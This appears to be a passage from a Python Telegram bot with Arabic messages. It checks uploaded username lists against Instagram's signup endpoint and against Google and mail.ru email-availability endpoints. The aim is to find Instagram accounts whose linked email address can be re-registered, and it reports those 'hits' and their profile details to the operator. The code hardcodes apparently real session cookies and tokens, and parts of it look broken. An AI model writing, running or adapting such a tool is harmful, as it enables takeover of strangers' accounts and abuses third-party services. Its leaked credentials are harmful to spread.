   elif '"body":{"exists":false,' in res.text:
    ema +=1
    allma +=1
    bot.send_message(z.chat.id,text=f'email : {email}')
   else:
    bad_p +=1
    allma +=1
  else:
   print(req)
   bma +=1
   allma +=1
  with open(filename, 'r') as dc:
   allline = dc.readlines()
   all_line = len(allline)
  ma1 = types.InlineKeyboardButton('Good Insta ►', callback_data='ma1')
  ma2 = types.InlineKeyboardButton(f'{gma}', callback_data='ma2')
  ma3 = types.InlineKeyboardButton('Bad Insta ►', callback_data='ma3')
  ma4 = types.InlineKeyboardButton(f'{bma}', callback_data='ma4')
  ma5 = types.InlineKeyboardButton('Error mail.ru ►', callback_data='ma5')
  ma6 = types.InlineKeyboardButton(f'{bad_p}', callback_data='ma6')
  ma7 = types.InlineKeyboardButton('Bad mail.ru ►', callback_data='ma7')
  ma8 = types.InlineKeyboardButton(f'{ama}', callback_data='ma8')
  ma9 = types.InlineKeyboardButton('Good mail.ru ►', callback_data='ma9')
  ma10 = types.InlineKeyboardButton(f'{ema}', callback_data='ma10')
  maname = types.InlineKeyboardButton(f'{filename}', callback_data='maname')
  maall = types.InlineKeyboardButton(f'{all_line}/{allma}', callback_data='maall')
  maemail = types.InlineKeyboardButton(f'{email}', callback_data='maemail')
  mamar = types.InlineKeyboardMarkup(row_width=2)
  mamar.add(ma9,ma10,ma1,ma2,ma3,ma4,ma5,ma6,ma7,ma8,maname,maall,maemail)
  if email.strip() == '@mail.ru':
  	bot.send_message(z.chat.id,text=f'<strong>تم انتهاء الفحص بنجاح✅\nعدد المتاحات : {ema}\nعدد اللسته : {all_line}</strong>',parse_mode='html')
  	break
  bot.edit_message_text(chat_id=z.chat.id,message_id=mssg.message_id,text=f'''<strong>
بدء الصيد حظاً موفقاً...🖤
<s>النوع : mail.ru</s>
</strong>
   ''',parse_mode='html', reply_markup=mamar)
def nf(z):
 gma = 0
 bma = 0
 ama = 0
 ema = 0
 allma = 0
 bad_p = 0
 try:
  filename = z.document.file_name
  fil = bot.get_file(z.document.file_id)
  dow = bot.download_file(fil.file_path)
  with open(filename, 'wb') as f0:
   f0.write(dow)
  p_file = open(filename, "r")
  mssg=bot.send_message(z.chat.id,text="wait a letile ...")
 except:
  bot.send_message(z.chat.id,text='''<strong>
عذرا لا يمكنني التعرف علي الشيء الذي ارسلته
الرجاء ارسال ملف صالح
</strong>
  ''',parse_mode='html')
  return
 with open(filename, 'r') as f1:
 	al_l = f1.readlines()
 	alll = len(al_l)
 while True:
  s = p_file.readline().split('\n')[0]
  try:
   emai = s.split('@')[0]
   sll = emai
   email = f'{emai}@gmail.com'
  except:
   emai = s

   sll = emai
   email = f'{emai}@gmail.com'
  url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
  headers = {
  'accept': '*/*',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
  'content-length': '61',
  'content-type': 'application/x-www-form-urlencoded',
  'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
  'origin': 'https://www.instagram.com',
  'referer': 'https://www.instagram.com/accounts/emailsignup/',
  'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
  'sec-ch-ua-mobile': '?0',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin',
  'user-agent': str(generate_user_agent()),
  'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
  'x-ig-app-id': '936619743392459',
  'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
  'x-instagram-ajax': '72bda6b1d047',
  'x-requested-with': 'XMLHttpRequest'
  }
  timg = str(time.time()).split('.')[0] 
  data = {
  'trustedDeviceRecords': '{}',
  'optIntoOneTap': 'false',
  'queryParams': '{}',
  'username': f'{s}',
  'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timg}:byvdsvbfgvt7'
  } 
  req = requests.post(url, headers=headers, data=data).text
  if  "This username isn't available. Please try another." in req:
   gma +=1
   allma +=1
   url2 = "https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=286306&rt=j"
   cok = secrets.token_hex(8) * 2
   head1 = {
  'accept': '*/*',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
  'content-length': '1072',
  'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
  'cookie': cok,
  'google-accounts-xsrf': '1',
  'origin': 'https://accounts.google.com',
  'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=IQ&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S2131635123%3A1683406620139000&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ar&ifkv=Af_xneFxEYIAB-S0HBLAxWqqT46JqUJ3RYcOwclgGa6nu2_d74JqsuB9NBKOBKsAl0Ft4u8NOtuznQ',
  'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
  'sec-ch-ua-arch': '',
  'sec-ch-ua-bitness': '',
  'sec-ch-ua-full-version-list': 'Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137',
  'sec-ch-ua-mobile': '?1',
  'sec-ch-ua-platform': 'Android',
  'sec-ch-ua-platform-version': '10.0.0',
  'sec-ch-ua-wow64': '?0',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin',
  'user-agent': 'Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
  'x-client-data': 'CIH4ygE=',
  'x-same-domain': '1',
} 
   ss = email.split('@')[0].strip()
   data = {  
  'f.req': f'["AEThLlxesmDPjlIUtsKkl4gagqph3sUY0IZmfw5lagvqpB1Lv36xsnFGRLoBooKieRg9-l5BgLByLWnE8iVWy5LhKSsm6500ujWsSYJ2Qlk4sSaCofqpx2baRre5kKwBa5m5I3o3RUuK3b_tBDNxI7JcmD2FcZgvq60lA7ZuV6qaHIHGtSnLwtp9AEOy8Xg9bMNP_vI73fXYqmGNtwnLkgr-EfASQx8tHQ","","","{ss}",true,"S2131635123:1683406620139000",1]',
}
   res= requests.post(url2, headers=head1, data=data).text
   skf = str(res.split('[[["gf.wuar",')[1]).split(',')[0]
   if skf=='1':
   	bma +=1
   	user09 = sll
   	url5 = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user09}'
   	headers5 = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cookie': 'mid=ZHTlnQALAAFHZAE8G64BeLHXNMv6; ig_did=ACB29C06-4F89-4B7A-9D37-DC433D1E9398; ig_nrcb=1; datr=nUZ1ZAphhPG3siVLQu3QFbkq; fbm_124024574287414=base_domain=.instagram.com; csrftoken=1gI1BSItuCt7GpIB7BL3KCrapTfKligx; ds_user_id=55002803434; sessionid=55002803434%3A1m1laRSPbJaoKD%3A24%3AAYdWXJwfQhhN68tU0NIkcNODEtrIYnAgKCWPkrp3Rg; shbid="12254\05455002803434\0541717693792:01f7d20c44658c09775e0f963159681bf19a10be70bbe95b497a89f112ac2fc01ab50da0"; shbts="1686157792\05455002803434\0541717693792:01f7c175c7d720e51402db9b91b351fab16619ea5a91f0ce421bc4c9827bce14e62426c5"; fbsr_124024574287414=Z3GOftVJ7wWK4lDsT4vYGKDlPKHv5vYXWQpT8AYi130.eyJ1c2VyX2lkIjoiMTAwMDg3NjM5MTE3ODM3IiwiY29kZSI6IkFRRHRIbWwtakhjY25sQmxidDJmcGpDZmtLV2stb2FQY0lLbHpWQWtfMUlhLTNqMF9wdlhsaFUyTnJvYXRsT2lvUmJfSXNzc19oSXFyYzFRX3BLZ1RaX1RSTEhCbGpzRTFHZkFjWWJoX0Q4aVVwYWdSR2Q0bVNXcUVwai1SajlkT1J5RmxadzZHbWZCc0ZCbVdUY0RDNDAzUFVnTzV2TVBONk1UcmpSUDlpTU85dFdSc0hURFdsUVhrNDJycVhvbzM2SHlnYXRNdDJMRWlNNUZrcmVfRWtiWGUzTTlqdzY4enpKT2RVUjlIUmt2TUlXcWZqQ2RUc3FmYUo5MWowUF95bm9aLVZCSnpmb0xuSkt3MV9JTkFTQzdEZmM3ZURIeDFiTkFyRS1SQ1FhYUp3ZWtydVdzMFBYaV9pTDdYTlZrRTg5Yy1oYWVrWVI1YU45cDhwVXp0ZXBsIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUhiWkNnM3M0UXJRZmhyOXRaQm5mdHI2cTlsYXJNMnpRaFpDZTNlczJOTGkwNGc4NGJaQldRTWs4VlpDWkNZMVZ3ak52azJ4M0d0VkxaQTdPajhZWkFkNklDdUxtMjI0NllhVTZQdXRlMk1PU3haQnpxbDhxUnU2UDhRYTZnRXhpUGRRbHB5WWJYSmVRczB3N2UzdFRxZXdnQWdUYXNpYzRjd0d3MHpaQUxTdXNCVUN3Y0JnVnk3MmdaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjg2MjA3NDQ4fQ; rur="ODN\05455002803434\0541717743459:01f7dc2b656c6f698ae45a64240745cb3e01e62cb90350349fcf91dba76a5d92e481be60"',
    'Referer': 'https://www.instagram.com/5u2.a/',
    'Sec-Ch-Prefers-Color-Scheme': 'dark',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.110", "Google Chrome";v="114.0.5735.110"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Viewport-Width': '624',
    'X-Asbd-Id': '129477',
    'X-Csrftoken': '1gI1BSItuCt7GpIB7BL3KCrapTfKligx',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': 'hmac.AR2f295htsHXPFyt6RxGipeoIQHM6Vikj5SuhBSAT7RgrCSq',
    'X-Requested-With': 'XMLHttpRequest',}
   	r5 = requests.get(url5,headers=headers5).json()
   	try:
   		name = r5['data']['user']['full_name']
   		bio = r5['data']['user']['biography']
   		fol = r5['data']['user']['edge_followed_by']['count']
   		fols = r5['data']['user']['edge_follow']['count']
   		id = r5['data']['user']['id']
   		bot.send_message(z.chat.id,text=f'''
name : {name}
Username : {user09}
Email : {user09}@gmail.com
Follower : {fol}
Folloers : {fols}
ID : {id}
BIO : {bio}
    	''')
   	except:
   		bot.send_message(z.chat.id,text=f'user : {user09}')
   else:
    bad_p +=1
    allma +=1
    #ot.send_message(z.chat.id,text='hl
  else:
   ama +=1
   allma +=1
  with open(filename, 'r') as dc:
   allline = dc.readlines()
   all_line = len(allline)
  ma1 = types.InlineKeyboardButton(f'HIT | {bma}', callback_data='ma1')
  ma2 = types.InlineKeyboardButton(f'Good | {gma}', callback_data='ma2')
  ma3 = types.InlineKeyboardButton(f'bad gmail | {bad_p}', callback_data='ma3')
  ma4 = types.InlineKeyboardButton(f'error | {ama}', callback_data='ma4')
  ma5 = types.InlineKeyboardButton(f'{filename} | {alll}/{allma}', callback_data='ma5')
  ma6 = types.InlineKeyboardButton(f'{email}', callback_data='ma6')
  
  
  mamar = types.InlineKeyboardMarkup()
  mamar.add(ma1)
  mamar.add(ma2,ma3,ma4)
  mamar.add(ma5)
  mamar.add(ma6)
  if email.strip() == '@gmail.com':
  	gmaa = gma - 1
  	bot.send_message(z.chat.id,text=f'''<strong>
تم انتهاء الفحص بنجاح✅
النوع : gmail.com
عدد المتاحات : {gmaa}
عدد اللسته : {all_line}
</strong>''',parse_mode='html')
  	break
  bot.edit_message_text(chat_id=z.chat.id,message_id=mssg.message_id,text=f'''<strong>
بدء الصيد حظاً موفقاً...🖤
<s>النوع : gmail.com</s>
</strong>
   ''',parse_mode='html', reply_markup=mamar)
   
def rm(z):
 allg = 0
 emailg = 0
 errorg = 0
 badg = 0
 elseg= 0
 hitg =0
 try:
  filename = z.document.file_name
  fil = bot.get_file(z.document.file_id)
  dow = bot.download_file(fil.file_path)
  with open(filename, 'wb') as f0:
   f0.write(dow)
  p_file = open(filename, "r")
  mssg=bot.send_message(z.chat.id,text="تم تلقي ملف")
 except:
  bot.send_message(z.chat.id,text='''<strong>
عذرا لا يمكنني التعرف علي الشيء الذي ارسلته
الرجاء ارسال ملف صالح
</strong>
  ''',parse_mode='html')
  return
 with open(filename, 'r') as f1:
 	al_l = f1.readlines()
 	alll = al_l[-1]
 while True:
  s = p_file.readline().split('\n')[0]
  try:
   emai = s.split('@')[0]
   email = f'{emai}@gmail'
  except:
   emai = s
   email = f'{emai}@gmail'
  url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
  print(email)
  head1 = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
		'content-length': '61',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/accounts/emailsignup/',
		'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': str(generate_user_agent()),
		'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
		'x-instagram-ajax': '72bda6b1d047',
		'x-requested-with': 'XMLHttpRequest'} 
  timg = str(time.time()).split('.')[0] 
  data = {'email' : str(email),
                 'username': str(email),
                 'first_name': 'my god',
                 'opt_into_one_tap': 'false'}
  res = requests.post(url,headers=head1,data=data).text()
  
  if "Another account is using the same email." in res:
   allg+=1
   emailg +=1
   url2 ='https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=154788&rt=j'
   head2 ={'accept': '*/*',
   	'accept-encoding': 'gzip, deflate, br',
   	'accept-language': 'en-US,en;q=0.9',
   	'content-length': '1438',
   	'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
   	'cookie': 'SEARCH_SAMESITE=CgQI25YB; OTZ=6792055_44_4444_; SID=RAinNFLERja0lKRcxKTGwte3BBN8bzNCqMubFX19Lde97aE4fY7D_sMHjo6XuVdKUV-Xyw.; Secure-1PSID=RAinNFLERja0lKRcxKTGwte3BBN8bzNCqMubFX19Lde97aE4laOIiRBXNyeMQwdwphjbUg.;CqMubFX19Lde97aE4laOIiRBXNyeMQwdwphjbUg.; __Secure-3PSID=RAinNFLERja0lKRcxKTGwte3BBN8bzNCqMubFX19Lde97aE4V3YW8gWyfRpDkl46o9_Iiw.; LSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:RAinNOKqver--AudVoHAZBX-U2oEhV1RHApzviJNXZXNA6YngZPSMzNTYC65_i3AW8TdQg.;__Host-1PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:RAinNOKqver--AudVoHAZBX-U2oEhV1RHApzviJNXZXNA6Yn6PiuCfrMPdSSoROOeVUhlg.; __Host-3PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:RAinNOKqver--AudVoHAZBX-U2oEhV1RHApzviJNXZXNA6YnUDf7kxCx9ka26udJtSSo4Q.; HSID=AysNCc5vbQuyrZ94X; SSID=AOdp0RI55mZtpIWEY; APISID=Q09m4Hg21VHkOZst/ADZHc9BijNz12RFTd; SAPISID=UKNah4ZoGcrkSgne/AAu27t--6n81WgtSecure-1PAPISID=UKNah4ZoGcrkSgne/AAu27t--6n81WgtZJ; ; __Secure-3PAPISID=UKNah4ZoGcrkSgne/AAu27t--6n81WgtZJ; ACCOUNT_CHOOSER=AFx_qI4PiNkdPH4MjUSeShOtDyXeCTWoH4cN1IKvCCgcR6Zk7V_S49zkSS0s0QtZ7A1MkQ8ihtYB9ou0oXpNjSWlK_fEcJ-JHqoWIjmp2W7N4pTUE9V1dgBB1m67_FI0thpdpCO2AggUliHIe300muyakrcIXklmjbrcGmehQ6UW5_QtMBM1eyI-dzfJ9p9-H_JBSMXkIz_LVwhOIW4wnlsGtZmVFGLL8ZpNtHaHgVgBFIL0jbsxWl6lr82lsN7xasVqP-ApI7F9K-cQTA7vnJIomE2EhAe1LgFSx0ekT4Bgdf9eockr43jInAlPJg9NAM5BL_5Uek2LI-ZyaZ7M1CCoj_Vs053-ajwys2f_6bx969rHtsnZRbk; AEC=AakniGPaIfCqYNy4Wubdi3OFmsHrfrrNDfCg4zrZMVaH5vz5RyyXtb47sg; 1P_JAR=2022-12-12-12; NID=511=E-xZdOJXwDro4oNYJE6-m3oMB0kR6lPyKQQ0xuvZ_jZhzR3MaUjNL6-7th64EAT-KEMf9V1tS_vemEoE2pvSC6lmVNaSg3DZPF2eOp2LiEOJG9ghl-Zwbge7zFK0KjMSymUOU1-BlDYRm-6y0RU4RryreUrueQ6-brJuTxCnNsnhmegxsRTbK5UOhfAci1NaZb9cT2eySlc7t9kar_2JHkc-jknXRFIW3zy6M0MzHNMBwInial1Te1W-diFudTqYLG_x1YKxArr--FdI65sQSYP5Kgqnse28QJYmo4rC8osnNCdrvAEnoR8G7-6ZLaiCe4hgmy9Yhk4YhGz-_qBOP47OJxV9hJPprGyJaZ_Gqbo_i1sJz9HEKTzZvjcrrFf2iC55uyJA3rgUzA8dIMG4neCfsZIE_gmFeRyZAHost-GAPS=1:B7nLTqxn9i07ubkARLeQgICamcI4KSHjtL9aG6WCYoVHJ7Uqm9tJNZ-pXFRnxlBzBWqW4ichCymiF2rVy_wL8lTS5o25jFOzdau_PFB1tcITAw:bQBpQhY9frzNibb5; SIDCC=AIKkIs1MzpPlVZOITtyx4JBhwmkOE8PuPhoOIQQwG_X41uJP2KVcW6HsNoI8IHkO-OncNE4TPg; ; __Secure-1PSIDCC=AIKkIs1hWcY2TH5F3hqv6aikagk3VNj9ZmDa6SDdLQN8iLBt8WmPLhUeXERd8AIboSoijqXduw; __Secure-3PSIDCC=AIKkIs3L4KnQ78Ee_tqUOpJ5G-35lWUc_SYXRNH0rcvS1X-4QseUZ9_9o6dVMIpSuAZJfIdhIto',
   	'google-accounts-xsrf': '1',
   	'origin': 'https://accounts.google.com', 
   	'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=IQ&continue=https%3A%2F%2Fmyaccount.google.com%2F&dsh=S-1945485880%3A1670846779787846&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ar&service=accountsettings&authuser=0',
   	'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
   	'sec-ch-ua-arch': '"x86"',
   	'sec-ch-ua-bitness': '"64"',
   	'sec-ch-ua-full-version': '"108.0.5359.99"',
   	'sec-ch-ua-full-version-list': '"Not?A_Brand";v="8.0.0.0", "Chromium";v="108.0.5359.99", "Google Chrome";v="108.0.5359.99"',
   	'sec-ch-ua-mobile': '?0',
   	'sec-ch-ua-platform': '"Windows"',
   	'sec-ch-ua-platform-version': '"10.0.0"',
   	'sec-ch-ua-wow64': '?0',
   	'sec-fetch-dest': 'empty',
   	'sec-fetch-mode': 'cors',
   	'sec-fetch-site': 'same-origin',
   	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
   	'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=84bf7e62-6751-416e-bb03-1edc3d7c194a,signin_mode=all_accounts,signout_mode=show_confirmation',
   	'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiVocsBCMz5zAEI0PrMAQjw/8wBCIaBzQEIsoLNAQ==',
   	'x-same-domain': '1'}
   data2 ={'continue': 'https://myaccount.google.com/',
		'dsh': 'S-1945485880:1670846779787846',
		'flowEntry': 'AddSession',
		'flowName': 'GlifWebSignIn',
		'hl': 'ar',
		'service': 'accountsettings',
		'f.req': f'["AEThLlzh5Scww-1m8JwyzReFSTnGYJmb1lZtAR8UPDzMC5rmkL5J7ulDLwBNTFBfbRtML0J-m428vdhhVLtGHtZNQO2ZJVjmO0zgT2tlUzc9MovgBT6fO_Rbo3aMz-teTuCG_ODCZ16v6xnmO3MvjQ3R_HuWeQviCdjhSfI4K60tW312kzYXlWp_jY5Biy9Bfv5Tw9BHLno4mE12Z1sYmtH6Vlg1ClZglw","dwdw","dwdwd","{email}",false,"S-1945485880:1670846779787846",1]',
		'at': 'AFoagUWOrPh2eTIj7kC4BCs3bVkdDJRlRg:1670847145084',
		'azt': 'AFoagUXfeklLmnPH7uk-FLsw0t0DRFccjQ:1670847145084',
		'cookiesDisabled': 'false',
		'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"84bf7e62-6751-416e-bb03-1edc3d7c194a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]'}
   req1 = requests.post(url2,headers=head2,data=data2).text
   
   if ('"EmailInvalid"') in req1:
    allg+=1
    badg +=1
   elif ('"gf.wuar",1') in req1:
  		hitg+=1
  		allg+=1
  		bot.send_message(z.chat.id,text=f'email : {email}')
  		########
   else:
  		elseg +=1
  		allg+=1
  else:
   errorg+=1
   allg+=1
  with open(filename, 'r') as dc:
   allline = dc.readlines()
   all_line = len(allline)
  g1 = types.InlineKeyboardButton(f'Hit ⇾ {hitg}', callback_data='g1')
  g2 = types.InlineKeyboardButton(f'Good insta ⇾ {emailg}', callback_data='g2')
  g3 = types.InlineKeyboardButton(f'Bad gmail ⇾ {badg}', callback_data='g3')
  g4 = types.InlineKeyboardButton('Error gmail ⇾ {elseg}', callback_data='g4')
  g5 = types.InlineKeyboardButton(f'Error ⇾ {errorg}', callback_data='g5')
  g6 = types.InlineKeyboardButton(f'{email}', callback_data='g6')
  g7 = types.InlineKeyboardButton(f'{all_line} / {allg}',callback_data='g7')
  g8 = types.InlineKeyboardButton(f'{filename}', callback_data='g8')
  gmailmar = types.InlineKeyboardMarkup(row_width=2)
  #gmailmar.add(g1)
  gmailmar.add(g1,g2,g3,g4,g5,g7,g8,g6)
  if email.strip() == '@gmail.com':
  	bot.send_message(z.chat.id,text=f''''<strong>تم انتهاء الفحص بنجاح✅
عدد المتاحات : {hitg}
عدد اللسته : {all_line}
</strong>''',parse_mode='html')
  	break
  bot.send_message(z.chat.id,text=f'''<strong>
بدء الصيد حظاً موفقاً...🖤
<s>النوع : gmail.com</s>
</strong>
   ''',parse_mode='html', reply_markup=gmailmar)
def rm(message):
	pass
		


def xnxx(xn):
	pass
while True:
	def deer():
		try:
			bot.polling(none_stop=True)
		except:
			deer()
	deer()
deer()